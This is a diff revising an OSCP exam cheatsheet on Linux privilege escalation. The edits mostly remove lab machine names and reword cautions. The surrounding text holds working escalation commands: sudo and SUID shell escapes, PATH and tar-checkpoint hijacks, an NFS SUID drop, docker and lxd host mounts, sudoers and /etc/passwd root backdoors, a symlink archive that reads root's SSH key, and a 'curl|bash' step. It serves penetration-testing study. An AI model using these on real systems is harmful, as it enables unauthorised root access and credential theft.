@@ -1,6 +1,8 @@
 # 03 · Linux Privilege Escalation
 
-> Part of the **OSCP/OSCP+ cheatsheet** — [← back to index](README.md)
+> Part of the **OSCP/OSCP+ cheatsheet** | [← back to index](README.md)
+
+> More: [root-run files and services](linux/root-run.md) · [groups, containers, and NFS](linux/groups-and-nfs.md) · [kernel checks](linux/kernel-checks.md)
 
 ---
 
@@ -10,7 +12,7 @@
 ```bash
 # Automated
 ./linpeas.sh | tee linpeas.txt        # serve via http, curl|bash
-# pspy to watch cron/processes WITHOUT root (catch cron jobs - Slonik pattern)
+# pspy to watch cron/processes without root
 ./pspy64
 # Manual quick hits
 id; sudo -l; uname -a; cat /etc/os-release
@@ -24,7 +26,7 @@ env; cat /etc/passwd; ls -la /opt /srv /var/www
 mount; cat /etc/fstab                          # nfs no_root_squash
 ```
 
-### sudo -l  (top priority — check first)
+### sudo -l  (top priority: check first)
 ```bash
 # Anything listed -> GTFOBins it. Common wins:
 sudo vim -c ':!/bin/sh'                  sudo less /etc/profile  -> !/bin/sh
@@ -47,7 +49,7 @@ cp /bin/bash /tmp/b; ... ; bash -p        # SUID bash copies / SUID cp /etc/pass
 export PATH=/tmp:$PATH ; echo '/bin/bash -p' > /tmp/service; chmod +x /tmp/service
 # strings the binary, ltrace it, find system()/exec calls
 ```
-**SUID bash directly** (Trick / Slonik / fail2ban patterns): `bash -p` gives euid root shell.
+**SUID bash directly**: `bash -p` gives euid root shell.
 
 ### Capabilities
 ```bash
@@ -67,12 +69,12 @@ touch ./--checkpoint=1; touch ./'--checkpoint-action=exec=sh shell.sh'
 # PATH-relative binary in root cron/script -> PATH hijack
 ```
 
-### PATH hijacking (DevArea pattern)
+### PATH hijacking
 Binary or script (SUID/cron/sudo) calls e.g. `service`/`ps`/`cat` without full path → put a malicious one earlier in `$PATH`. Watch shebang & `set -e`/`pipefail` quirks in target scripts.
 
-### NFS no_root_squash (Slonik-adjacent)
+### NFS no_root_squash (NFS)
 ```bash
-# kali (as root) — mount the export, drop a SUID-root bash
+# kali (as root): mount the export, drop a SUID-root bash
 mkdir /mnt/x; mount -o rw,vers=3 $IP:/export /mnt/x
 cp /bin/bash /mnt/x/rootbash; chmod +s /mnt/x/rootbash
 # target
@@ -102,9 +104,9 @@ sudo -i        # you're root
 - `/etc/sudoers.d/pwn` → `youruser ALL=(ALL) NOPASSWD:ALL` (file MUST be mode 0440, no syntax errors). Cleanest.
 - `/etc/passwd` → append a `uid=0` user with a known hash (see above).
 - root cron (`/etc/cron.d/x`) → reverse shell on a schedule.
-- `/root/.ssh/authorized_keys` → only works if `PermitRootLogin` allows it (often disabled — don't burn time here first).
+- `/root/.ssh/authorized_keys` → only works if `PermitRootLogin` allows it. Check the setting first.
 
-**Archive-extraction variant (zip-slip / symlink-in-archive).** A root process that *extracts* an attacker-supplied `.zip`/`.tar` and preserves or follows **symlink members** gives the same primitive. Note: many libraries sanitize `../` traversal (collapsing dot segments) yet still mishandle symlink entries — so when plain `../../` is filtered, try a **symlink member** instead:
+**Archive-extraction variant (zip-slip / symlink-in-archive).** A root process that *extracts* an attacker-supplied `.zip`/`.tar` and preserves or follows **symlink members** gives the same primitive. Note: many libraries sanitize `../` traversal (collapsing dot segments) yet still mishandle symlink entries: so when plain `../../` is filtered, try a **symlink member** instead:
 ```bash
 # source-side symlink in the archive -> arbitrary READ as root (if extraction reads the link)
 ln -s /root/.ssh/id_rsa leak; zip --symlinks evil.zip leak
@@ -114,30 +116,29 @@ ln -s /root/.ssh/id_rsa leak; zip --symlinks evil.zip leak
 
 ### Service / systemd / D-Bus / docker / lxd
 ```bash
-# docker group (Kobold pattern): 
+# docker group:
 docker run -v /:/mnt --rm -it alpine chroot /mnt sh
 # lxd group:
 lxc init alpine c -c security.privileged=true; lxc config device add c d disk source=/ path=/mnt; lxc start c; lxc exec c sh
 # writable .service / writable ExecStart binary run by root -> replace + restart
-# newgrp docker (Kobold) if your secondary group includes docker
+# newgrp docker if your secondary group includes docker
 ```
 
-### Kernel exploits (last resort — can crash the box)
+### Kernel exploits (last resort: can crash the box)
 ```bash
 uname -a ; searchsploit linux kernel <version>
 # Classics: DirtyCow (CVE-2016-5195), DirtyPipe (CVE-2022-0847), PwnKit/polkit (CVE-2021-4034), 
 #   Sudo Baron Samedit (CVE-2021-3156), GameOverlay (CVE-2023-2640/32629)
-# PwnKit is a reliable go-to on many older boxes:
-./PwnKit        # self-contained
+# Match the exact package build and patch state before considering a manual path.
 ```
 
 ### Other
-- Readable backups / config files with creds (Slonik: pg backup analysis).
+- Readable backups and configuration files with credentials.
 - `.bash_history`, `.mysql_history`, `.viminfo`, `/var/mail`, `/var/backups`.
-- Password reuse across users/services — always try found creds with `su`/SSH.
+- Password reuse across users/services: always try found creds with `su`/SSH.
 - Internal-only service on 127.0.0.1 → forward it out and attack (see Pivoting).
 
-### Restricted shell escape (rbash / lshell / limited menus — Dante lshell pattern)
+### Restricted shell escape (rbash / lshell / limited menus)
 ```bash
 # Break out to a real shell:
 vi              # then  :set shell=/bin/bash   ->  :shell    (or  :!/bin/bash)
